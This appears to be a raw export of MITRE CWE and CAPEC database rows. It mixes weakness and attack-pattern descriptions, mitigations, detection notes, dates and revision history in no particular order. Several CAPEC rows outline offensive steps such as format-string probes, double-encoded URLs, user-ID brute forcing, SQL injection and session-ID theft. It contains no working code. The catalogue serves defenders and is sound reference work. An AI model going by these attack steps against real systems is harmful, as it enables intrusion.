12535	83	v4 [DRAFT]
17752	88	Missing Standardized Error Handling Mechanism
5663	63	Other
9847	35	MITRE
19021	23	The code uses an operator for comparison when the intention was to perform an assignment.
10028	35	MITRE
17772	62	updated Relationships, Taxonomy_Mappings
16251	40	Advanced knowledge of software capabilities of a manufacturer's product.
15926	30	Karsten Nohl
22952	39	2019-06-20
24230	62	updated Relationships
17178	62	updated Alternate_Terms
16494	35	MITRE
14961	81	Integrity
7111	31	1000
20378	56	ChildOf
8761	35	MITRE
23307	35	MITRE
8461	47	Execute Unauthorized Commands
23472	35	MITRE
24232	23	An adversary provides a malicious version of a resource at a location that is similar to the expected location of a legitimate resource. After establishing the rogue location, the adversary waits for a victim to visit the location and access the malicious resource.
5654	35	MITRE
6902	72	Client-side checks for authentication can be easily bypassed, allowing clients to escalate their access levels and perform unintended actions.
7156	51	2014-06-23
11145	104	502
22957	63	Read Files or Directories
12531	59	Updated Related_Attack_Patterns
21361	23	An attack of this type exploits a programs' vulnerabilities that allows an attacker's commands to be concatenated onto a legitimate command with the intent of targeting other resources such as the file system or database. The system that uses a filter or a blacklist input validation, as opposed to whitelist validation is vulnerable to an attacker who predicts delimiters (or combinations of delimiters) not present in the filter or blacklist. As with other injection attacks, the attacker uses the command delimiter payload as an entry point to tunnel through the application and activate additional attacks through SQL queries, shell commands, network scanning, and so on.
18921	91	System Configuration
17418	59	Updated Related_Attack_Patterns
17183	50	Design: Prior to performing CSS parsing, require the CSS to start with well-formed CSS when it is a cross-domain load and the MIME type is broken. This is a browser level fix.                Implementation: Perform proper HTML encoding and URL escaping
8330	79	Confidentiality
9435	23	The software defines a function that is used as a handler for more than one signal.
20649	52	Automated static analysis typically has limited utility in recognizing resource exhaustion problems, except for program-independent system resources such as files, sockets, and processes. For system resources, automated static analysis may be able to detect circumstances in which resources are not released after they have expired. Automated analysis of configuration files may be able to detect settings that do not specify a maximum value.                   Automated static analysis tools will not be appropriate for detecting exhaustion of custom resources, such as an intended security policy in which a bulletin board user is only allowed to make a limited number of posts per day.
22133	86	http://www.javaworld.com/javaworld/javaqa/2000-05/03-qa-0526-pass.html
11013	35	MITRE
15104	57	Resultant
20965	62	updated Relationships
18005	62	updated Relationships
11592	62	updated Demonstrative_Examples
22097	35	Cigital
21694	70	RFC 3629 - UTF-8, a transformation format of ISO 10646
17877	43	Simple
22743	28	CWE Content Team
5582	39	2010-12-13
5814	23	The software encounters an error but does not provide a status code or return value to indicate that an error has occurred.
6028	103	Primary
7231	88	Covert Channel
21999	28	CWE Content Team
24192	35	MITRE
12482	104	913
6940	35	MITRE
24483	79	Availability
20944	100	The MITRE Corporation
12947	70	Bypassing Web Authentication and Authorization with HTTP Verb Tampering: How to inadvertently allow attackers full access to your web application
18141	39	2019-01-03
20535	74	1
18335	101	CAPEC Content Team
17579	104	616
8451	40	The target software must fail to anticipate all of the possible valid encodings of an IP/web address.
15662	63	Other
19344	35	MITRE
8088	31	699
23775	86	http://www.owasp.org/index.php/Guide_to_Authentication
13623	28	CWE Content Team
12408	81	Access Control
10675	51	2014-06-23
13331	102	ChildOf
21262	63	Other
22483	62	updated Relationships
8644	42	While it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict whitelist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).
22111	59	Updated Resources_Required
8915	35	MITRE
12224	39	2014-06-23
16963	49	2010
12052	21	CWE Content Team
5928	73	Search via internet for known, published services.
15922	39	2017-11-08
7585	35	MITRE
15966	62	updated Relationships, Taxonomy_Mappings
8271	30	Marcus Niemietz
8202	62	updated Related_Attack_Patterns
20219	39	2019-01-03
24289	31	699
11920	47	Other
16590	81	Integrity
22247	76	2019-09-30
24261	70	Supply Chain Attacks: Can We Secure Information Technology Supply Chain in the Age of Globalization
22995	28	CWE Content Team
21242	55	CAPEC Content Team
22491	34	OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.
19290	101	CAPEC Content Team
20462	21	Anonymous Tool Vendor (under NDA)
14543	35	MITRE
9623	67	Medium
20066	27	None: No specialized resources are required to execute this type of attack.
16758	62	updated Potential_Mitigations
5631	39	2009-07-17
20253	39	2009-05-27
12474	28	CWE Content Team
8757	31	1000
13771	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Formal Methods / Correct-By-Construction                            Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)
9724	31	699
21760	72	The uninitialized resource may contain values that cause program flow to change in ways that the programmer did not intend.
6280	101	CAPEC Content Team
21316	103	Primary
12718	40	The target must collect information from the user in a series of forms where each form has its own URL that the attacker can anticipate and the application must fail to detect attempts to access intermediate forms without first filling out the previous forms.
16030	81	Confidentiality
19937	27	None: No specialized resources are required to execute this type of attack.
20573	21	CWE Content Team
9892	28	CWE Content Team
5947	28	CWE Content Team
22390	56	ChildOf
18238	28	CWE Content Team
13690	23	The software uses an unnecessarily complex internal representation for its data structures or interrelationships between those structures.
10845	81	Confidentiality
10663	35	MITRE
25005	88	J2EE Misconfiguration: Insufficient Session-ID Length
18948	35	MITRE
18559	69	Incomplete
10164	39	2008-10-14
6357	28	CWE Content Team
13266	28	CWE Content Team
21248	39	2008-10-14
22374	39	2011-09-13
13064	39	2017-11-08
6810	28	CWE Content Team
24351	28	CWE Content Team
24158	35	MITRE
23926	26	Implementation
20239	35	MITRE
25037	39	2017-05-03
13894	103	Primary
20418	51	2015-11-09
8160	76	2019-04-04
8805	70	Wikipedia
20089	104	675
24261	32	Verizon, Inc.
24665	39	2012-05-11
7994	39	2015-12-07
12448	62	updated Demonstrative_Examples
16627	62	updated Relationships, Taxonomy_Mappings
10398	35	MITRE
9191	39	2008-07-01
8370	92	Explore
5603	26	Implementation
7803	91	Implementation
24086	63	Reduce Performance
21808	91	Operation
18890	28	Eric Dalci
14296	39	2017-01-19
17350	39	2009-03-10
11060	35	MITRE
20517	86	http://blogs.msdn.com/cisg/archive/2008/12/15/anti-xss-3-0-beta-and-cat-net-community-technology-preview-now-live.aspx
22812	47	Unreliable Execution
7590	56	ChildOf
14290	35	MITRE
10953	28	CWE Content Team
18984	31	1000
17330	31	1000
12867	79	Authorization
17968	35	MITRE
16199	39	2015-12-07
16682	63	Modify Memory
6707	76	2018-07-31
15440	28	CWE Content Team
20796	23	The Secure attribute for sensitive cookies in HTTPS sessions is not set, which could cause the user agent to send those cookies in plaintext over an HTTP session.
23394	74	2
11055	23	An adversary utilizes a resource leak on the target to deplete the quantity of the resource available to service legitimate requests. Resource leaks most often come in the form of memory leaks where memory is allocated but never released after it has served its purpose, however, theoretically, any other resource that can be reserved can be targeted if the target fails to release the reservation when the reserved resource block is no longer needed. In this attack, the adversary determines what activity results in leaked resources and then triggers that activity on the target. Since some leaks may be small, this may require a large number of requests by the adversary. However, this attack differs from a flooding attack in that the rate of requests is generally not significant. This is because the lost resources due to the leak accumulate until the target is reset, usually by restarting it. Thus, a resource-poor adversary who would be unable to flood the target can still utilize this attack. Resource depletion through leak differs from resource depletion through allocation in that, in the former, the adversary may not be able to control the size of each leaked allocation, but instead allows the leak to accumulate until it is large enough to affect the target's performance. When depleting resources through allocation, the allocated resource may eventually be released by the target so the attack relies on making sure that the allocation size itself is prohibitive of normal operations by the target.
15799	28	CWE Content Team
11670	63	Bypass Protection Mechanism
11339	39	2014-06-23
14824	39	2008-11-24
18113	55	CAPEC Content Team
11170	28	CWE Content Team
10839	76	2015-11-09
14991	53	The MITRE Corporation
21621	28	CWE Content Team
10335	23	The program violates the Enterprise JavaBeans (EJB) specification by using the class loader.
12208	39	2017-11-08
19633	91	Implementation
7291	28	CWE Content Team
19221	53	The MITRE Corporation
6956	35	MITRE
22972	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies
10701	45	Base
20442	49	2012
23364	92	Exploit
7853	103	Primary
12844	43	Simple
10270	39	2012-10-30
19814	28	CWE Content Team
7503	42	Run or compile the software using features or extensions that automatically provide a protection mechanism that mitigates or eliminates buffer overflows.                   For example, certain compilers and extensions provide automatic buffer overflow detection mechanisms that are built into the compiled code. Examples include the Microsoft Visual Studio /GS flag, Fedora/Red Hat FORTIFY_SOURCE GCC flag, StackGuard, and ProPolice.
12781	62	updated Potential_Mitigations, Time_of_Introduction
22378	86	http://www.dwheeler.com/secure-programs/Secure-Programs-HOWTO/semantic-attacks.html
9713	62	updated Related_Attack_Patterns, Relationships, Weakness_Ordinalities
21570	62	updated Common_Consequences
17894	39	2014-07-30
25370	28	CWE Content Team
16419	62	updated Relationships
21684	101	CAPEC Content Team
18278	81	Other
17843	62	updated Common_Consequences
15265	28	CWE Content Team
19325	35	MITRE
23365	79	Accountability
23634	39	2009-03-10
22782	63	Modify Application Data
15319	28	CWE Content Team
7246	28	CWE Content Team
23381	31	1000
20162	72	Without appropriate protection mechanisms, the client can easily tamper with cookies and similar web data. Reliance on the cookies without detailed validation can lead to problems such as SQL injection. If you use cookie values for security related decisions on the server side, manipulating the cookies might lead to violations of security policies such as authentication bypassing, user impersonation and privilege escalation. In addition, storing sensitive data in the cookie without appropriate protection can also lead to disclosure of sensitive user data, especially data stored in persistent cookies.
7399	79	Confidentiality
10058	39	2009-05-27
11465	35	MITRE
13734	39	2011-06-27
11265	28	Eric Dalci
23127	35	MITRE
22660	90	Language-Independent
20579	101	CAPEC Content Team
10094	81	Other
13185	94	Utilize the built-in software update mechanisms of the commercial components to deliver software that could compromise security credentials, enable a denial-of-service attack, or enable tracking.
11273	63	Read Application Data
6435	51	2014-06-23
13210	35	MITRE
23622	43	Simple
23314	39	2011-06-27
8439	39	2010-06-21
19411	62	updated Demonstrative_Examples
14172	28	CWE Content Team
18844	35	MITRE
25012	85	325
17195	35	MITRE
25130	62	updated Relationships
20213	81	Access Control
15396	62	updated Common_Consequences, Demonstrative_Examples
8958	26	Implementation
18976	23	In this attack pattern, the adversary monitors network traffic between nodes of a public or multicast network in an attempt to capture sensitive information at the protocol level. Network sniffing applications can reveal TCP/IP, DNS, Ethernet, and other low-level network communication information. The adversary takes a passive role in this attack pattern and simply observes and analyzes the traffic. The adversary may precipitate or indirectly influence the content of the observed transaction, but is never the intended recipient of the target information.
13462	103	Primary
14126	56	ChildOf
17381	35	MITRE
20045	50	Do not enable the feature of "Hidden SSIDs" (also known as "Network Cloaking") – this option disables the usual broadcasting of the SSID by the access point, but forces the mobile handset to send requests on all supported radio channels which contains the SSID. The result is that tracking of the mobile device becomes easier since it is transmitting the SSID more frequently.
7267	62	updated Relationships, Taxonomy_Mappings
7779	100	The MITRE Corporation
23805	42	Make sure that technologies consuming the resources are not vulnerable (e.g. buffer overflow, format string, etc.) in a way that would allow code execution if the name of the resource is malformed.
19552	56	ChildOf
15139	89	Meta
8918	28	CWE Content Team
23544	62	updated Potential_Mitigations, Time_of_Introduction
20492	73	Lure the victim to the malicious site through a cross-site scripting attack.
15554	28	CWE Content Team
13337	62	updated White_Box_Definitions
11699	28	CWE Content Team
9522	28	CWE Content Team
24603	23	Product A handles inputs or steps differently than Product B, which causes A to perform incorrect actions based on its perception of B's state.
22796	35	MITRE
20141	62	updated Relationships, Other_Notes, Taxonomy_Mappings
24811	35	MITRE
18042	44	High
12223	95	[Determine use of XML with DTDs] Examine application input to identify XML input that leverage the use of one or more DTDs.
17790	46	The lack of proper data encryption passes up the guarantees of confidentiality, integrity, and accountability that properly implemented encryption conveys.
12206	50	Encrypt all sensitive communications using properly-configured cryptography.
10959	35	MITRE
19732	35	Cigital
14672	85	215
12194	28	CWE Content Team
14090	55	CAPEC Content Team
23816	56	ChildOf
5980	28	CWE Content Team
21118	62	updated Common_Consequences
8277	81	Confidentiality
6229	35	MITRE
22207	47	Other
13712	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Focused Manual Spotcheck - Focused manual analysis of source                            Manual Source Code Review (not inspections)
15658	56	ChildOf
15528	62	updated References
7578	61	Stable
13309	62	updated Potential_Mitigations
18817	28	CWE Content Team
20678	35	MITRE
11772	56	ChildOf
15726	39	2017-11-08
19590	62	updated Description, Name
8508	31	699
18961	42	Do not store sensitive information in files which may be misinterpreted.
22682	81	Integrity
15426	28	CWE Content Team
10897	62	updated Relationships, Taxonomy_Mappings
10345	53	The MITRE Corporation
11311	28	CWE Content Team
23656	30	Gordon "Fyodor" Lyon
23536	28	CWE Content Team
16379	50	It is important to protect WSDL file or provide limited access to it.
22237	35	Veracode
12360	69	Draft
18841	89	Standard
14755	63	Read Application Data
13435	39	2009-07-27
11305	42	Implement a lockout timeout that grows as the number of incorrect login attempts goes up, eventually resulting in a complete lockout.
19396	101	CAPEC Content Team
19238	42	Protect access control list files.
21757	28	CWE Content Team
14839	28	CWE Content Team
6944	101	CAPEC Content Team
12431	35	MITRE
23790	85	497
21561	86	http://en.wikipedia.org/wiki/PaX
9795	63	Read Files or Directories
6527	39	2008-07-01
18865	79	Confidentiality
10482	46	Software needs to validate data at the proper time, after data has been canonicalized and cleansed. Early validation is susceptible to various manipulations that result in dangerous inputs that are produced by canonicalization and cleansing.
10227	28	CWE Content Team
11754	81	Other
13352	91	Implementation
10780	33	W3C
23416	39	2009-07-27
25111	39	2011-06-01
21129	90	C++
14937	35	MITRE
13584	44	SOAR Partial
10267	24	MITRE
23326	63	Other
11709	62	updated Maintenance_Notes, Relationships, Taxonomy_Mappings
17485	35	MITRE
19243	74	4
25224	26	Architecture and Design
12741	39	2018-03-27
7451	99	Apple
21908	23	The program violates the Enterprise JavaBeans (EJB) specification by using thread synchronization primitives.
5649	28	CWE Content Team
21787	81	Integrity
21778	23	The software records password hashes in a data store, receives a hash of a password from a client, and compares the supplied hash to the hash obtained from the data store.
6238	35	MITRE
11051	56	ChildOf
18922	69	Incomplete
9823	62	updated Potential_Mitigations
11261	39	2012-10-30
14928	35	MITRE
22655	92	Exploit
18899	76	2018-07-31
9738	80	If the attacker is able to gain good understanding of the system's database schema
12556	35	MITRE
13960	95	The attacker steals a session ID from a valid user.
19591	62	updated Demonstrative_Examples, Potential_Mitigations, References
17750	35	MITRE
23763	62	updated Detection_Factors, Relationships, Taxonomy_Mappings
20527	39	2017-11-08
7570	53	The MITRE Corporation
10011	45	Base
18962	102	ChildOf
25054	43	Simple
14471	48	06
14390	39	2012-05-11
13380	39	2014-07-30
10929	72	If this invariant is not upheld, it is likely to cause trouble if objects of this class are stored in a collection. If the objects of the class in question are used as a key in a Hashtable or if they are inserted into a Map or Set, it is critical that equal objects have equal hashcodes.
11987	88	Creation of Temporary File in Directory with Incorrect Permissions
6033	73	Inject probe payload which contains formatting characters (%s, %d, %n, etc.) through input parameters.
12115	28	CWE Content Team
20535	73	Collect social information via Non-traditional sources. See also: CAPEC-118.
17851	23	The source code uses symbolic constants, but it does not      sufficiently place the definitions of these constants into a more centralized or      isolated location.
8416	91	Architecture and Design
11514	40	Advanced knowledge about the download and update installation processes.
6859	91	Operation
15438	35	MITRE
23181	35	Cigital
14791	26	Implementation
15832	44	SOAR Partial
11174	62	updated Observed_Examples
21137	31	699
12872	63	Execute Unauthorized Code or Commands
15512	39	2014-07-30
10494	72	An attacker could gain privileges by modifying or reading critical data directly, or by accessing insufficiently-protected, privileged functionality.
19038	43	Simple
17720	62	updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings
16681	35	MITRE
24620	39	2008-11-24
15347	56	ChildOf
19684	35	MITRE
15664	66	Financial Privacy: The Gramm-Leach Bliley Act (GLBA)
12727	60	11
8816	21	CLASP
5634	67	High
6249	47	Resource Consumption
9183	103	Primary
21746	35	MITRE
23432	92	Exploit
6060	39	2008-07-01
24923	66	Rainbow Hash Cracking
12185	61	Draft
9864	39	2012-05-11
6229	28	CWE Content Team
13684	39	2011-06-01
24450	27	A script or program capable of generating more requests than the target can handle, or a network or cluster of objects all capable of making simultaneous requests.
7578	89	Meta
18117	42	Use the appropriate type for the desired action. For example, in C/C++, only use unsigned types for values that could never be negative, such as height, width, or other numbers related to quantity.
23035	31	1000
19954	48	03
14436	31	1000
19795	63	DoS: Crash, Exit, or Restart
7780	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
24975	72	The attacker may be able to create or overwrite critical files that are used to execute code, such as programs or libraries.
20644	62	updated Applicable_Platforms
18572	62	updated Maintenance_Notes, Relationships, Taxonomy_Mappings, Time_of_Introduction
21500	103	Primary
23389	56	ChildOf
13679	85	30
9013	39	2011-03-29
9764	81	Confidentiality
19889	39	2009-05-27
20943	61	Stable
21134	78	Medium
7851	39	2011-06-27
21487	90	ASP.NET
25135	26	Implementation
16851	28	CWE Content Team
10318	63	Read Memory
24119	39	2008-07-01
24759	55	CAPEC Content Team
16585	24	Cigital
25387	54	High
9288	21	PLOVER
17654	62	updated Common_Consequences
6944	76	2019-09-30
15697	79	Authorization
7336	28	CWE Content Team
23686	62	updated Description, Name
20596	62	updated Relationships
25268	62	updated Common_Consequences, Demonstrative_Examples, Other_Notes, Potential_Mitigations, Weakness_Ordinalities
24043	77	Black Box
15889	39	2009-07-27
24260	56	ChildOf
19649	56	ChildOf
12211	62	updated Applicable_Platforms, Common_Consequences, Description, Observed_Examples, Other_Notes, Potential_Mitigations, Relationship_Notes, Relationships
7435	39	2015-12-07
12793	35	MITRE
6743	97	SSL Flood
24742	47	Read Data
6935	39	2011-09-13
5626	28	CWE Content Team
10207	35	MITRE
18018	104	1080
21993	35	MITRE
7216	62	updated Maintenance_Notes, Other_Notes, Theoretical_Notes
23901	28	CWE Content Team
13121	51	2014-06-23
25370	35	MITRE
11464	56	ChildOf
9382	51	2014-06-23
15970	63	Execute Unauthorized Code or Commands
15662	63	Execute Unauthorized Code or Commands
7415	42	Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software.
11179	95	[Abuse the system through filter failure] An attacker writes a script to consistently induce the filter failure.
15159	80	The attacker needs to be able to poison the resolver - DNS entries or local hosts file or router entry pointing to a trusted DNS server - in order to successfully carry out a pharming attack. Setting up a fake website, identical to the targeted one, does not require special skills.
12321	42	Avoid storing passwords in easily accessible locations.
6244	66	Clickjacking - OWASP
21211	88	Inappropriate Source Code Style or Formatting
18929	39	2008-09-08
21060	21	PLOVER
14699	59	Updated Consequences, Related_Weaknesses
19331	66	Cyclomatic Complexity
16020	62	updated Relationships, Weakness_Ordinalities
22884	39	2013-07-17
5933	51	2014-06-23
17263	62	updated Demonstrative_Examples
11579	40	The target must leverage and access an underlying file system.
19855	35	MITRE
15551	39	2014-06-23
16377	43	Simple
24804	90	Language-Independent
7266	90	Language-Independent
17082	39	2012-05-11
15079	35	MITRE
13073	104	123
6208	103	Primary
12543	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Configuration Checker                            Permission Manifest Analysis
5629	88	Unsafe ActiveX Control Marked Safe For Scripting
20182	56	ChildOf
11664	81	Integrity
6486	28	CWE Content Team
5696	103	Primary
18389	39	2014-07-30
10736	35	MITRE
18085	81	Availability
5597	101	CAPEC Content Team
16355	104	336
20796	104	614
24436	95	Extract ticket and save to disk
15345	39	2019-06-20
16543	69	Draft
8474	62	updated Relationships
11816	28	CWE Content Team
11306	26	Architecture and Design
18617	78	Low
15134	53	The MITRE Corporation
21860	26	Implementation
21618	60	15
12282	59	Updated References, Related_Weaknesses
9459	95	[Probe entry points to locate vulnerabilities] Try double-encoding for parts of the input in order to try to get past the filters. For instance, by double encoding certain characters in the URL (e.g. dots and slashes) an adversary may try to get access to restricted resources on the web server or force browse to protected pages (thus subverting the authorization service). An adversary can also attempt other injection style attacks using this attack pattern: command injection, SQL injection, etc.
17919	26	Implementation
18572	35	MITRE
17266	33	Paul C. van Oorschot
18949	40	The victim must follow a crafted link that references a scripting file that is mis-typed as a non-executable file.
11407	96	2018-07-02
23424	21	CLASP
8427	56	ChildOf
20692	92	Explore
8999	47	Read Data
18930	39	2008-09-08
10936	62	updated Relationships, Taxonomy_Mappings
16607	81	Access Control
19855	39	2010-04-05
8491	39	2011-09-13
6938	79	Integrity
15659	62	updated Demonstrative_Examples
20575	39	2009-10-29
6530	28	CWE Content Team
9125	47	Execute Unauthorized Commands
9470	46	For example, attacks such as OS fingerprinting rely heavily on both behavioral and response discrepancies.
23735	96	2018-07-02
13543	33	Android Open Source Project
20489	62	updated Common_Consequences
20164	101	CAPEC Content Team
16912	28	CWE Content Team
24799	47	Resource Consumption
17877	90	C
22451	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Automated Monitored Execution
14271	39	2008-07-01
18070	35	MITRE
20634	62	updated Time_of_Introduction
20492	73	Lure the victim to the malicious site by manipulating URLs on a site trusted by the victim.
24001	35	MITRE
12733	104	165
11212	43	Simple
18674	46	Failure for a system to check for hard links can result in vulnerability to different types of attacks. For example, an attacker can escalate their privileges if a file used by a privileged program is replaced with a hard link to a sensitive file (e.g. /etc/passwd). When the process opens the file, the attacker can assume the privileges of that process.
16526	21	CWE Content Team
11603	97	Infected Hardware
18495	104	1038
24955	21	CWE Content Team
20653	59	Updated Related_Attack_Patterns
24761	24	MITRE
22573	91	Operation
24827	28	CWE Content Team
9116	90	Java
10680	81	Access Control
7905	28	CWE Content Team
7620	35	MITRE
24189	91	Implementation
8211	43	Simple
9421	26	Operation
18887	104	164
20875	77	Automated Static Analysis - Binary or Bytecode
20468	91	Implementation
20326	31	1000
8665	39	2011-06-01
22256	97	Dictionary-based Password Attack
12731	79	Availability
17693	35	MITRE
6846	28	Eric Dalci
21883	24	MITRE
12116	28	CWE Content Team
20409	62	updated Potential_Mitigations
16916	42	Data should be private static and final whenever possible. This will assure that your code is protected by instantiating early, preventing access and tampering.
16983	28	CWE Content Team
17557	39	2008-09-08
10193	89	Detailed
20976	81	Confidentiality
8752	28	CWE Content Team
10190	70	Hacking and Securing iOS Applications
9476	90	Language-Independent
6902	63	Bypass Protection Mechanism
22466	35	MITRE
14566	90	Language-Independent
9653	39	2012-10-30
21660	39	2012-10-30
6017	62	updated Relationships, Taxonomy_Mappings
10840	39	2014-07-30
13828	35	MITRE
16464	28	CWE Content Team
8715	66	Our password hashing has no clothes
24392	50	Use safe libraries to access resources such as files.
11223	62	updated Related_Attack_Patterns
19351	52	Manual analysis can be useful for finding this weakness, but it might not achieve desired code coverage within limited time constraints. This becomes difficult for weaknesses that must be considered for all inputs, since the attack surface can be too large.
23868	35	Veracode
7185	35	MITRE
22384	39	2012-10-30
17076	47	Bypass Protection Mechanism
19019	74	5
6766	28	CWE Content Team
7193	63	Unexpected State
16588	47	Bypass Protection Mechanism
22256	50	Implement an intelligent password throttling mechanism. Care must be taken to assure that these mechanisms do not excessively enable account lockout attacks such as CAPEC-02.
8307	40	The system has a lockout mechanism.
7811	61	Draft
24830	55	CAPEC Content Team
14367	35	MITRE
12189	59	Updated Description Summary, Related_Attack_Patterns, Related_Weaknesses
6011	43	Simple
21956	28	CWE Content Team
21814	35	MITRE
10969	81	Access Control
24160	28	CWE Content Team
22916	81	Availability
17133	91	Implementation
22060	63	Modify Memory
5648	35	MITRE
10049	42	Developers should anticipate that quotes will be injected/removed/manipulated in the input vectors of their software system. Use an appropriate combination of black lists and whitelists to ensure only valid, expected and appropriate input is processed by the system.
14532	92	Explore
14287	68	This will only be applicable to cases where user input can influence the size or frequency of resource allocations.
9349	85	214
11579	50	Design: Input validation. Assume that user inputs are malicious. Utilize strict type, character, and encoding enforcement.
14358	43	Simple
6259	39	2018-03-27
12053	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
20848	62	updated Description, Potential_Mitigations
22688	35	Cigital
7614	38	Too many exceptions generated by the application as a result of malformed queries
18624	62	updated Applicable_Platforms, Demonstrative_Examples, Detection_Factors
13772	101	CAPEC Content Team
21690	47	Hide Activities
16884	28	CWE Content Team
13195	62	updated Description, Name
17218	45	Variant
19995	39	2011-03-29
16509	35	Cigital
23999	56	ChildOf
18157	62	updated Relationships, Taxonomy_Mappings
23414	31	699
6463	101	CAPEC Content Team
23437	53	The MITRE Corporation
25101	103	Primary
14549	26	Implementation
21848	63	Bypass Protection Mechanism
23239	50	Encrypt and password-protect sensitive data.
18537	35	MITRE
23116	62	updated Relationships, Taxonomy_Mappings
12903	28	CWE Content Team
10806	63	Read Files or Directories
24700	39	2013-07-17
24355	35	MITRE
23105	42	Compartmentalize the system to have "safe" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.                   Ensure that appropriate compartmentalization is built into the system design and that the compartmentalization serves to allow for and further reinforce privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide when it is appropriate to use and to drop system privileges.
8031	63	Execute Unauthorized Code or Commands
21384	21	Evgeny Lebanidze
10437	28	CWE Content Team
15766	49	2008
17454	62	updated Description, Other_Notes
12969	25	Low
15201	62	updated Relationships
22126	56	ChildOf
23339	39	2019-06-20
24687	66	Secure Programming with Static Analysis
5733	104	97
18426	47	Gain Privileges
15222	39	2008-11-24
9813	103	Primary
12334	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Formal Methods / Correct-By-Construction                                                                     Cost effective for partial coverage:                                                                           Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)
6603	35	MITRE
20083	101	CAPEC Content Team
6427	28	CWE Content Team
12992	72	An attacker may be able to elevate privileges.
22961	28	CWE Content Team
9261	35	MITRE
20301	47	Execute Unauthorized Commands
11842	100	The MITRE Corporation
7940	62	updated Description, Other_Notes
16846	28	CWE Content Team
9569	39	2008-09-08
17254	48	02
18088	31	1000
21156	76	2017-05-01
6884	23	The product uses a regular expression that either (1) contains an executable component with user-controlled inputs, or (2) allows a user to enable execution by inserting pattern modifiers.
12956	35	MITRE
17213	35	MITRE
20041	76	2018-07-31
6561	28	CWE Content Team
20098	39	2012-05-11
15086	35	MITRE
20537	62	updated Description, Relationships, Other_Notes, Taxonomy_Mappings
10226	35	MITRE
6375	35	MITRE
11499	40	Deployed code that has been signed by its authoring vendor, or a partner.
6348	63	Unexpected State
23086	31	699
16480	76	2015-11-09
18633	28	CWE Content Team
22387	62	updated Relationships, Taxonomy_Mappings
5752	62	updated Relationships, Taxonomy_Mappings
24629	62	updated Potential_Mitigations
17823	35	MITRE
15104	43	Simple
20264	28	CWE Content Team
12636	40	The target must employ a stateless firewall that lacks a rule set that rejects unsolicited ACK packets.
7782	62	updated Modes_of_Introduction, References, Relationships
16698	58	Due to how addition is performed by computers, if a primitive is incremented past the maximum value possible for its storage space, the system will not recognize this, and therefore increment each bit as if it still had extra space. Because of how negative numbers are represented in binary, primitives interpreted as signed may "wrap" to very large negative values.
20359	28	CWE Content Team
22627	101	CAPEC Content Team
18872	39	2012-05-11
12935	90	Language-Independent
15586	73	Analyze source code for open-source systems like Linux, Apache, etc.
9938	62	updated Relationships
10472	39	2008-07-01
11004	47	Execute Unauthorized Commands
24613	85	317
9527	28	CWE Content Team
7386	103	Primary
22568	62	updated Description, Enabling_Factors_for_Exploitation, Modes_of_Introduction, Relationships
18103	62	updated Related_Attack_Patterns
7447	62	updated Relationships
10673	28	CWE Content Team
23377	79	Integrity
21333	103	Primary
15362	21	CLASP
22966	55	CAPEC Content Team
24510	56	ChildOf
22905	26	Operation
20704	28	CWE Content Team
11898	62	updated Relationships
20555	39	2010-02-16
12709	42	When dropping privileges, ensure that they have been dropped successfully to avoid CWE-273. As protection mechanisms in the environment get stronger, privilege-dropping calls may fail even if it seems like they would always succeed.
21021	28	CWE Content Team
20268	39	2014-07-30
12691	55	CAPEC Content Team
24346	42	Before calling privileged APIs, always ensure that the assumptions made by the privileged code hold true prior to making the call.
24645	39	2019-09-19
10301	39	2008-07-01
21299	49	1995
23300	28	CWE Content Team
21101	103	Primary
25412	62	updated Type
18281	63	Read Application Data
8794	62	updated Relationships, Other_Notes, Taxonomy_Mappings
6375	28	CWE Content Team
13949	35	MITRE
17122	39	2008-09-08
18383	31	699
6683	28	CWE Content Team
18495	23	The product uses a mechanism that automatically optimizes code, e.g. to improve a characteristic such as performance, but the optimizations can have an unintended side effect that might violate an intended security assumption.
17814	28	CWE Content Team
15307	81	Confidentiality
12823	35	MITRE
24562	39	2008-09-08
19397	62	updated Common_Consequences
15292	62	updated Common_Consequences
11616	42	Use a zero-knowledge password protocol, such as SRP.
17051	56	ChildOf
19716	40	FIN scanning requires the use of raw sockets, and thus cannot be performed from some Windows systems (Windows XP SP 2, for example). On Unix and Linux, raw socket manipulations require root privileges.
15223	62	updated Taxonomy_Mappings
8666	28	CWE Content Team
22226	25	Medium
22095	27	BGP Router
13859	28	CWE Content Team
11268	81	Confidentiality
19109	104	346
22176	62	updated Demonstrative_Examples, Description, Name, Relationship_Notes, Relationships
12151	26	Architecture and Design
9648	39	2012-10-30
16598	63	Other
6567	62	updated Relationships
16979	96	2018-07-02
11485	73	The attacker chooses a predefined identifier that he knows.
7700	62	updated Relationships
19959	28	CWE Content Team
17626	28	CWE Content Team
24300	92	Explore
5952	103	Primary
15398	26	Implementation
16862	31	1003
12678	35	MITRE
6100	73	Attempt to brute force user IDs if system reveals whether a given user ID is valid or not upon failed login attempts.
24921	95	[Exploit SQL Injection vulnerability] Use the information obtained in the previous steps to successfully inject the database in order to bypass checks or modify, add, retrieve or delete data from the database
13919	51	2014-06-23
9208	28	CWE Content Team
15050	23	An attacker injects malicious content into an application's DTD in an attempt to produce a negative technical impact. DTDs are used to describe how XML documents are processed. Certain malformed DTDs (for example, those with excessive entity expansion as described in CAPEC 197) can cause the XML parsers that process the DTDs to consume excessive resources resulting in resource depletion.
6728	39	2014-06-23
